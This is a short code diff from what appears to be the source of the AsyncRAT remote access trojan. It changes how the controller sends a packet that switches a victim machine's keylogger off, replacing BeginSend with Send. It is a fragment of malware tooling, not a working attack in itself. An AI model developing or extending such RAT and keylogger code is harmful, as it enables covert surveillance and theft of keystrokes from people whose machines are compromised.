@@ -33,7 +33,7 @@ namespace AsyncRAT_Sharp.Forms
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
             msgpack.ForcePathObject("isON").AsString = "false";
-            ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
         }
     }
 }
